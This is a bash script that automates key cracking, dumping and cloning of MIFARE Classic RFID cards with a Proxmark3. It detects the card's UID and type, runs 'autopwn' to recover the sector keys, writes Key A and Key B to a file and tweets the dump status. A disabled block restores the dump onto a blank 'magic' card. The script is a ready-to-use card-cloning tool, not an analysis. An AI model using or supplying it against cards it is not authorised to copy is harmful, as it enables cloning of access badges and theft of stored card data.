#!/bin/bash

# MIFARE Classic Pwn, Dump and clone
#
# For now it is based only on HF Mifare Classic
# It tries to get the UID, stores it and create a folder named the same
# Determines if 1K or 4K
# Autopwn, Dump and Clone


DATE_BIN=$(command -v date)
d=`${DATE_BIN} +%d-%m-%y_%H.%M.%S`

#Pre-defined Variables
OUTPATH=./NinjaArchive/
VARK1="1K"
VARK4="4K"

# Make sure that there aren't other procs using the device
sudo killall -9 proxmark3

sleep 1
mkdir -p "$OUTPATH" # Using the path /home/$USER/... it was using /home/root
sleep 1
cd ${OUTPATH}

# Obtain the UID

RFIDUID=$(pm3 -c 'hf search' | grep UID: | cut -c 11- | sed 's/[[:space:]]//g')

#If no Tag found, exit
if [ -z "$RFIDUID" ]
then
	echo "No Valid TAG Found"
	echo "Exiting!"
	sleep 3
	exit 0
fi

echo "UID:"$RFIDUID
mkdir -p -v "$RFIDUID"
cd ${RFIDUID}

# If Tag found, check if 1K or 4K
MCl=$(pm3 -c "hf search" | grep MIFARE | cut -c 23-)

if [ "$MCl" = "1K" ] || [ "$MCl" = "4K" ] # MISSING 2K and Mini types (see S20, S50, S70)
then
	echo "Type:"$MCl
	post="Type:$MCl-$d"
	#printf "\nt $post\n exit()" | rainbowstream # Tweet the type (Disabled)
	# AUTOPWN and Collecting Data
	echo "Trying Autopwn..."

	pm3 -c "hf mf autopwn" > result.txt

	cat result.txt | grep hf-mf-$RFIDUID-key.bin | cut -c 35-
	cat result.txt | grep hf-mf-$RFIDUID-dump.bin | cut -c 36-
	cat result.txt | grep hf-mf-$RFIDUID-dump.eml | cut -c 33-
	cat result.txt | grep hf-mf-$RFIDUID-dump.json | cut -c 23-

	echo "Dump finished!"
	RFIDKEY=$(grep FYI result.txt | cut -c 16- | cut -c 1-12)
	AKEY=$(grep 000 result.txt | cut -c 13- | cut -c 1-13)
	echo "Key A: "$AKEY
	echo "Key B: "$RFIDKEY
	echo "Key A: $AKEY" >> keys.txt
	echo "Key B: $RFIDKEY" >> keys.txt
	printf "\nt $post \n KeyDump-OK \n $d \n exit()" | rainbowstream # Tweet type and if dump OK = Ready to clone

	### Something wrong. Latest Tag has been overwritten randomly, losing access
	#echo "Place an empty TAG to clone the dump"
	#sleep 10
	#MAGICUID=$(pm3 -c 'hf search' | grep UID: | cut -c 11- | sed 's/[[:space:]]//g')
	##If no Tag found, exit
	#if [ -z "$MAGICUID" ]
	#then
        #	echo "No Valid TAG Found"
        #	echo "Exiting!"
        #	sleep 1
        #	exit 0
	#fi
	#echo "Magic UID:"$MAGICUID
	#echo "Cloning..."
	#if [ "$MCl" = "1K" ]
	#then
	#	K=1k
	#elif ["$MCl" = "4K"]
	#then
	#	K=4k
	#else
	#	echo "Type unknown"
	#fi
	#pm3 -c "hf mf restore --$K --uid $RFIDUID"

else
	echo "Not Mifare Classic, use the terminal!"
fi

exit 0
